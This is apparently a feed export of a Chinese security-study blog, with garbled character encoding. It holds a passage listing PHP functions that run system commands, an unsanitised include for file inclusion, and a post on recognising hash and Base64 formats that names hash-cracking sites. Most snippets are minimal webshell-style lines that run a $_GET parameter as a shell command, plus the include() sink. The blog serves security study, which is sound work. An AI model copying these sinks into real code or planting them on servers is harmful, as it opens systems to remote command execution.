<h2 id="ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"><a href="#ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š" class="headerlink" title="ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"></a>ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š</h2><h3 id="1-system"><a href="#1-system" class="headerlink" title="1) system()"></a>1) system()</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="2-passthru"><a href="#2-passthru" class="headerlink" title="2) passthru()"></a>2) passthru()</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="3-exec"><a href="#3-exec" class="headerlink" title="3) exec()"></a>3) exec()</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="4-sell-exec"><a href="#4-sell-exec" class="headerlink" title="4) sell_exec()"></a>4) sell_exec()</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="5-pcntl-exec"><a href="#5-pcntl-exec" class="headerlink" title="5) pcntl_exec()"></a>5) pcntl_exec()</h3><p>è¦æ±‚ï¼šlinuxç³»ç»Ÿç‰¹æœ‰æ¨¡å—ï¼Œéœ€ç¼–è¯‘é€‰é¡¹ä¸­å­˜åœ¨â€”enable-pcntl</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>( <span class="string">&quot;/bin/bash&quot;</span> , <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="6-popen"><a href="#6-popen" class="headerlink" title="6) popen()"></a>6) popen()</h3><p>popen â€” æ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆã€‚æ‰“å¼€ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹çš„ç®¡é“ï¼Œè¯¥è¿›ç¨‹ç”±æ´¾ç”Ÿç»™å®šçš„ command å‘½ä»¤æ‰§è¡Œè€Œäº§ç”Ÿ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">popen â€” æ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆã€‚æ‰“å¼€ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹çš„ç®¡é“ï¼Œè¯¥è¿›ç¨‹ç”±æ´¾ç”Ÿç»™å®šçš„ command å‘½ä»¤æ‰§è¡Œè€Œäº§ç”Ÿ</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$test</span>,<span class="string">&quot;r&quot;</span>);  <span class="comment">//popenæ‰“ä¸€ä¸ªè¿›ç¨‹é€šé“</span></span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;      <span class="comment">//ä»é€šé“å–å‡ºå†…å®¹</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">4096</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="7-proc-open"><a href="#7-proc-open" class="headerlink" title="7) proc_open()"></a>7) proc_open()</h3><p>ç±»ä¼¼ popen() å‡½æ•°ï¼Œ ä½†æ˜¯ proc_open() æä¾›äº†æ›´åŠ å¼ºå¤§çš„æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„èƒ½åŠ›</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">ç±»ä¼¼ <span class="title function_ invoke__">popen</span>() å‡½æ•°ï¼Œ ä½†æ˜¯ <span class="title function_ invoke__">proc_open</span>() æä¾›äº†æ›´åŠ å¼ºå¤§çš„æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„èƒ½åŠ›</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å…¥</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å‡ºå†…å®¹</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//æ ‡å‡†è¾“å‡ºé”™è¯¯</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹é€šé“</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//ä¸ºä»€ä¹ˆæ˜¯$pipes[1]ï¼Œå› ä¸º1æ˜¯è¾“å‡ºå†…å®¹</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="8-åå•å¼•å·"><a href="#8-åå•å¼•å·" class="headerlink" title="8) åå•å¼•å·"></a>8) åå•å¼•å·</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `whoami`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="å››ã€æ–‡ä»¶åŒ…å«"><a href="#å››ã€æ–‡ä»¶åŒ…å«" class="headerlink" title="å››ã€æ–‡ä»¶åŒ…å«"></a>å››ã€æ–‡ä»¶åŒ…å«</h2><p>includeå°†ä¼šåŒ…å«è¯­å¥å¹¶æ‰§è¡ŒæŒ‡å®šæ–‡ä»¶ PHPçš„é…ç½®æ–‡ä»¶allowurlfopenå’Œallow_url_includeè®¾ç½®ä¸ºON  include/requireç­‰åŒ…å«å‡½æ•°å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶ include include_once requeire require_once  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="äº”ã€phpä¼ªåè®®ã€web-studyå·²è®°ã€‘"><a href="#äº”ã€phpä¼ªåè®®ã€web-studyå·²è®°ã€‘" class="headerlink" title="äº”ã€phpä¼ªåè®®ã€web-studyå·²è®°ã€‘"></a>äº”ã€<a href="../../../../Web-study">phpä¼ªåè®®ã€web-studyå·²è®°ã€‘</a></h2><h2 id="å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°"><a href="#å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°" class="headerlink" title="å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°"></a>å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="selector-class">.file_put_contents</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="selector-class">.file_put_contents</span>($file, $string);</span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="selector-class">.copy</span> <span class="built_in">highlight_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">4</span><span class="selector-class">.fopen</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">5</span><span class="selector-class">.read</span> <span class="built_in">file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">6</span><span class="selector-class">.fread</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">7</span><span class="selector-class">.fgetss</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">8</span><span class="selector-class">.fgets</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">9</span><span class="selector-class">.parse_ini_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">10</span><span class="selector-class">.show_source</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">11</span><span class="selector-class">.file</span>()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>åŠ å¯†å¯†æ–‡ç‰¹å¾</title>
    <url>/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<p><u><a href="https://blog.51cto.com/u_15274949/2931589">åŸæ–‡é“¾æ¥</a></u></p>
<span id="more"></span>

<h2 id="1ã€MD5â€”â€”ç¤ºä¾‹"><a href="#1ã€MD5â€”â€”ç¤ºä¾‹" class="headerlink" title="1ã€MD5â€”â€”ç¤ºä¾‹"></a>1ã€MD5â€”â€”ç¤ºä¾‹</h2><p><u><strong>21232F297A57A5A743894A0E4A801FC3</strong></u></p>
<p>ä¸€èˆ¬MD5å€¼æ˜¯<u>32ä½</u>ç”±æ•°å­—<code>0-9</code>å’Œå­—æ¯<code>a-f</code>æ‰€ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œå¦‚å›¾ã€‚<u>å¦‚æœå‡ºç°è¿™ä¸ªèŒƒå›´ä»¥å¤–çš„å­—ç¬¦è¯´æ˜è¿™å¯èƒ½æ˜¯ä¸ªé”™è¯¯çš„md5å€¼</u>ï¼Œå°±æ²¡å¿…è¦å†æ‹¿å»è§£å¯†äº†ã€‚16ä½å€¼æ˜¯å–çš„æ˜¯8~24ä½ã€‚</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175149372.png" alt="image-20220721175149372"></p>
<p>md5çš„ä¸‰ä¸ªç‰¹å¾ï¼š</p>
<p>1.<strong>ç¡®å®šæ€§</strong>ï¼šä¸€ä¸ªåŸå§‹æ•°æ®çš„MD5å€¼æ˜¯å”¯ä¸€çš„ï¼ŒåŒä¸€ä¸ªåŸå§‹æ•°æ®ä¸å¯èƒ½ä¼šè®¡ç®—å‡ºå¤šä¸ªä¸åŒçš„MD5å€¼ã€‚</p>
<p>2.<strong>ç¢°æ’æ€§</strong>ï¼š<u>åŸå§‹æ•°æ®ä¸å…¶MD5å€¼å¹¶ä¸æ˜¯ä¸€ä¸€å¯¹åº”çš„</u>ï¼Œæœ‰å¯èƒ½å¤šä¸ªåŸå§‹æ•°æ®è®¡ç®—å‡ºæ¥çš„MD5å€¼æ˜¯ä¸€æ ·çš„ï¼Œè¿™å°±æ˜¯ç¢°æ’ã€‚</p>
<p>3.<strong>ä¸å¯é€†</strong>ï¼šä¹Ÿå°±æ˜¯è¯´å¦‚æœå‘Šè¯‰ä½ ä¸€ä¸ªMD5å€¼ï¼Œä½ æ˜¯æ— æ³•é€šè¿‡å®ƒè¿˜åŸå‡ºå®ƒçš„åŸå§‹æ•°æ®çš„ï¼Œè¿™ä¸æ˜¯ä½ çš„æŠ€æœ¯ä¸å¤Ÿç‰›ï¼Œè¿™æ˜¯ç”±å®ƒçš„ç®—æ³•æ‰€å†³å®šçš„ã€‚å› ä¸ºæ ¹æ®ç¬¬2ç‚¹ï¼Œ<u>ä¸€ä¸ªç»™å®šçš„MD5å€¼æ˜¯å¯èƒ½å¯¹åº”å¤šä¸ªåŸå§‹æ•°æ®çš„</u>ï¼Œå¹¶ä¸”ç†è®ºä¸Šè®²æ˜¯å¯ä»¥å¯¹åº”æ— é™å¤šä¸ªåŸå§‹æ•°æ®ï¼Œæ‰€æœ‰æ— æ³•ç¡®å®šåˆ°åº•æ˜¯ç”±å“ªä¸ªåŸå§‹æ•°æ®äº§ç”Ÿçš„ã€‚</p>
<h2 id="2ã€sha1â€”â€”ç¤ºä¾‹"><a href="#2ã€sha1â€”â€”ç¤ºä¾‹" class="headerlink" title="2ã€sha1â€”â€”ç¤ºä¾‹"></a>2ã€sha1â€”â€”ç¤ºä¾‹</h2><p><u><strong>d033e22ae348aeb5660fc2140aec35850c4da997</strong></u></p>
<p>è¿™ç§åŠ å¯†çš„å¯†æ–‡ç‰¹å¾è·ŸMD5å·®ä¸å¤šï¼Œåªä¸è¿‡<u>ä½æ•°æ˜¯40</u></p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175316568.png" alt="image-20220721175316568"></p>
<h2 id="3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹"><a href="#3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹" class="headerlink" title="3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹"></a>3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹</h2><p><u><strong>5b696ae7da9442ead7adc24d03cedb65</strong></u></p>
<p>HMAC (Hash-based Message Authentication Code) å¸¸ç”¨äºæ¥å£ç­¾åéªŒè¯ï¼Œè¿™ç§ç®—æ³•å°±æ˜¯åœ¨å‰ä¸¤ç§åŠ å¯†çš„åŸºç¡€ä¸Šå¼•å…¥äº†ç§˜é’¥ï¼Œè€Œç§˜é’¥åˆåªæœ‰ä¼ è¾“åŒæ–¹æ‰çŸ¥é“ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šæ˜¯ç ´è§£ä¸äº†çš„</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175340163.png" alt="image-20220721175340163"></p>
<h2 id="4ã€NTLMâ€”â€”ç¤ºä¾‹"><a href="#4ã€NTLMâ€”â€”ç¤ºä¾‹" class="headerlink" title="4ã€NTLMâ€”â€”ç¤ºä¾‹"></a>4ã€NTLMâ€”â€”ç¤ºä¾‹</h2><p><u><strong>209c6174da490caeb422f3fa5a7ae634</strong></u></p>
<p>è¿™ç§åŠ å¯†æ˜¯Windowsçš„å“ˆå¸Œå¯†ç ï¼Œæ˜¯ Windows NT æ—©æœŸç‰ˆæœ¬çš„æ ‡å‡†å®‰å…¨åè®®ã€‚ä¸å®ƒç›¸åŒçš„è¿˜æœ‰Domain Cached Credentialsï¼ˆåŸŸå“ˆå¸Œï¼‰ã€‚</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175431939.png" alt="image-20220721175431939"></p>
<h2 id="ç›¸ä¼¼åŠ å¯†ç±»å‹"><a href="#ç›¸ä¼¼åŠ å¯†ç±»å‹" class="headerlink" title="ç›¸ä¼¼åŠ å¯†ç±»å‹"></a>ç›¸ä¼¼åŠ å¯†ç±»å‹</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#    ç®—æ³•       é•¿åº¦</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span> 	md5 	 <span class="number">32</span>/<span class="number">16</span></span><br><span class="line"><span class="attribute">2</span> 	sha1 	    <span class="number">40</span></span><br><span class="line"><span class="attribute">3</span> 	sha256 	    <span class="number">64</span></span><br><span class="line"><span class="attribute">4</span> 	sha512 	   <span class="number">128</span></span><br><span class="line"><span class="attribute">5</span> 	adler32 	 <span class="number">8</span></span><br><span class="line"><span class="attribute">6</span> 	crc32 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">7</span> 	crc32b       <span class="number">8</span></span><br><span class="line"><span class="attribute">8</span> 	fnv132 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">9</span> 	fnv164 	    <span class="number">16</span></span><br><span class="line"><span class="attribute">10</span> 	fnv1a32 	 <span class="number">8</span></span><br><span class="line"><span class="attribute">11</span> 	fnv1a64     <span class="number">16</span></span><br><span class="line"><span class="attribute">12</span> 	gost 	    <span class="number">64</span></span><br><span class="line"><span class="attribute">13</span> 	gost-crypto <span class="number">64</span></span><br><span class="line"><span class="attribute">14</span> 	haval128,<span class="number">3</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">15</span> 	haval128,<span class="number">4</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">16</span> 	haval128,<span class="number">5</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">17</span> 	haval160,<span class="number">3</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">18</span> 	haval160,<span class="number">4</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">19</span> 	haval160,<span class="number">5</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">20</span> 	haval192,<span class="number">3</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">21</span> 	haval192,<span class="number">4</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">22</span> 	haval192,<span class="number">5</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">23</span> 	haval224,<span class="number">3</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">24</span> 	haval224,<span class="number">4</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">25</span> 	haval224,<span class="number">5</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">26</span> 	haval256,<span class="number">3</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">27</span> 	haval256,<span class="number">4</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">28</span> 	haval256,<span class="number">5</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">29</span> 	joaat 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">30</span> 	md2          <span class="number">32</span></span><br><span class="line"><span class="attribute">31</span> 	md4 	     <span class="number">32</span></span><br><span class="line"><span class="attribute">32</span> 	ripemd128 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">33</span> 	ripemd160 	 <span class="number">40</span></span><br><span class="line"><span class="attribute">34</span> 	ripemd256 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">35</span> 	ripemd320 	 <span class="number">80</span></span><br><span class="line"><span class="attribute">36</span> 	sha224 	     <span class="number">56</span></span><br><span class="line"><span class="attribute">37</span> 	sha3-<span class="number">224</span> 	 <span class="number">56</span></span><br><span class="line"><span class="attribute">38</span> 	sha3-<span class="number">256</span> 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">39</span> 	sha3-<span class="number">384</span> 	 <span class="number">96</span></span><br><span class="line"><span class="attribute">40</span> 	sha3-<span class="number">512</span> 	 <span class="number">128</span></span><br><span class="line"><span class="attribute">41</span> 	sha384       <span class="number">96</span></span><br><span class="line"><span class="attribute">42</span> 	sha512/<span class="number">224</span>   <span class="number">56</span></span><br><span class="line"><span class="attribute">43</span> 	sha512/<span class="number">256</span> 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">44</span> 	snefru       <span class="number">64</span></span><br><span class="line"><span class="attribute">45</span> 	snefru256    <span class="number">64</span></span><br><span class="line"><span class="attribute">46</span> 	tiger128,<span class="number">3</span> 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">47</span> 	tiger128,<span class="number">4</span> 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">48</span> 	tiger160,<span class="number">3</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">49</span> 	tiger160,<span class="number">4</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">50</span> 	tiger192,<span class="number">3</span> 	 <span class="number">48</span></span><br><span class="line"><span class="attribute">51</span> 	tiger192,<span class="number">4</span>   <span class="number">48</span></span><br><span class="line"><span class="attribute">52</span> 	whirlpool 	 <span class="number">128</span></span><br><span class="line"><span class="attribute">53</span> 	mysql 	     è€MYSQLæ•°æ®åº“ç”¨çš„ï¼Œ<span class="number">16</span>ä½ï¼Œä¸”ç¬¬<span class="number">1</span>ä½å’Œç¬¬<span class="number">7</span>ä½å¿…é¡»ä¸º<span class="number">0</span>-<span class="number">8</span></span><br><span class="line"><span class="attribute">54</span> 	mysql5 	     <span class="number">40</span></span><br><span class="line"><span class="attribute">55</span> 	NTLM 	     <span class="number">32</span></span><br><span class="line"><span class="attribute">56</span> 	Domain Cached Credentials 	<span class="number">32</span></span><br></pre></td></tr></table></figure></div>

<h2 id="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š"><a href="#å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š" class="headerlink" title="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š"></a>å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š</h2><p><code>www.cmd5.comï¼ˆå¸¦æ‰¹é‡è§£å¯†å·¥å…·ï¼‰</code></p>
<p><code>www.somd5.com</code></p>
<p><code>cmd5.la</code></p>
<p><code>pmd5.com</code></p>
<p><code>www.ttmd5.comï¼ˆå¸¦æ‰¹é‡è§£å¯†å·¥å…·ï¼‰</code></p>
<hr>
<p><u>Base64ã€Base58ã€Base32ã€Base16ã€Base85ã€Base100ç­‰ç›¸ä¼¼åŠ å¯†ç±»å‹</u></p>
<h2 id="1ã€Base64â€”â€”ç¤ºä¾‹"><a href="#1ã€Base64â€”â€”ç¤ºä¾‹" class="headerlink" title="1ã€Base64â€”â€”ç¤ºä¾‹"></a>1ã€Base64â€”â€”ç¤ºä¾‹</h2><p><u><strong>YWRtaW4tcm9vdA==</strong></u></p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹å¯†æ–‡å°¾éƒ¨éƒ½ä¼šæœ‰ä¸¤ä¸ªç­‰å·ï¼Œæ˜æ–‡å¾ˆå°‘çš„æ—¶å€™åˆ™æ²¡æœ‰</p>
<p>Base64ç¼–ç è¦æ±‚æŠŠ3ä¸ª8ä½å­—èŠ‚ï¼ˆ38=24ï¼‰è½¬åŒ–ä¸º4ä¸ª6ä½çš„å­—èŠ‚ï¼ˆ46=24ï¼‰ï¼Œä¹‹ååœ¨6ä½çš„å‰é¢è¡¥ä¸¤ä¸ª0ï¼Œå½¢æˆ8ä½ä¸€ä¸ªå­—èŠ‚çš„å½¢å¼ã€‚å¦‚æœå‰©ä¸‹çš„å­—ç¬¦ä¸è¶³3ä¸ªå­—èŠ‚ï¼Œåˆ™ç”¨0å¡«å……ï¼Œè¾“å‡ºå­—ç¬¦ä½¿ç”¨â€˜=â€™ï¼Œå› æ­¤ç¼–ç åè¾“å‡ºçš„æ–‡æœ¬æœ«å°¾å¯èƒ½ä¼šå‡ºç°1æˆ–2ä¸ªâ€˜=â€™ï¼Œå¦‚å›¾ã€‚</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180138424.png" alt="image-20220721180138424"></p>
<p>ä¸ºäº†ä¿è¯æ‰€è¾“å‡ºçš„ç¼–ç ä½å¯è¯»å­—ç¬¦ï¼ŒBase64åˆ¶å®šäº†ä¸€ä¸ªç¼–ç è¡¨ï¼Œä»¥ä¾¿è¿›è¡Œç»Ÿä¸€è½¬æ¢ã€‚ç¼–ç è¡¨çš„å¤§å°ä¸º2^6=64ï¼Œè¿™ä¹Ÿæ˜¯Base64åç§°çš„ç”±æ¥ã€‚</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180249541.png" alt="image-20220721180249541"></p>
<h3 id="Base64ä½¿ç”¨æ³¨æ„é—®é¢˜"><a href="#Base64ä½¿ç”¨æ³¨æ„é—®é¢˜" class="headerlink" title="Base64ä½¿ç”¨æ³¨æ„é—®é¢˜"></a>Base64ä½¿ç”¨æ³¨æ„é—®é¢˜</h3><h4 id="ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜"><a href="#ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜" class="headerlink" title="ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜"></a>ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜</h4><p>æ ‡å‡†çš„Base64å¹¶ä¸é€‚åˆç›´æ¥æ”¾åœ¨URLé‡Œä¼ è¾“ï¼Œå› ä¸ºURLç¼–ç å™¨ä¼šæŠŠæ ‡å‡†Base64ä¸­çš„â€œ/â€å’Œâ€œ+â€å­—ç¬¦å˜ä¸ºå½¢å¦‚â€œ%XXâ€çš„å½¢å¼ï¼Œè€Œè¿™äº›â€œ%â€å·åœ¨å­˜å…¥æ•°æ®åº“æ—¶è¿˜éœ€è¦å†è¿›è¡Œè½¬æ¢ï¼Œå› ä¸ºANSI SQLä¸­å·²å°†â€œ%â€å·ç”¨ä½œé€šé…ç¬¦ã€‚</p>
<p>ä¸ºè§£å†³æ­¤é—®é¢˜ï¼Œå¯é‡‡ç”¨ä¸€ç§ç”¨äºURLçš„æ”¹è¿›Base64ç¼–ç ï¼Œå®ƒåœ¨æœ«å°¾å¡«å……â€™=â€™å·ï¼Œå¹¶å°†æ ‡å‡†Base64ä¸­çš„â€œ+â€å’Œâ€œ/â€åˆ†åˆ«æ”¹æˆäº†â€œ-â€å’Œâ€œ_â€ï¼Œè¿™æ ·å°±å…å»äº†åœ¨URLç¼–è§£ç å’Œæ•°æ®åº“å­˜å‚¨æ—¶æ‰€è¦ä½œçš„è½¬æ¢ï¼Œé¿å…äº†ç¼–ç ä¿¡æ¯é•¿åº¦åœ¨æ­¤è¿‡ç¨‹ä¸­çš„å¢åŠ ï¼Œå¹¶ç»Ÿä¸€äº†æ•°æ®åº“ã€è¡¨å•ç­‰å¤„å¯¹è±¡æ ‡è¯†ç¬¦çš„æ ¼å¼ã€‚</p>
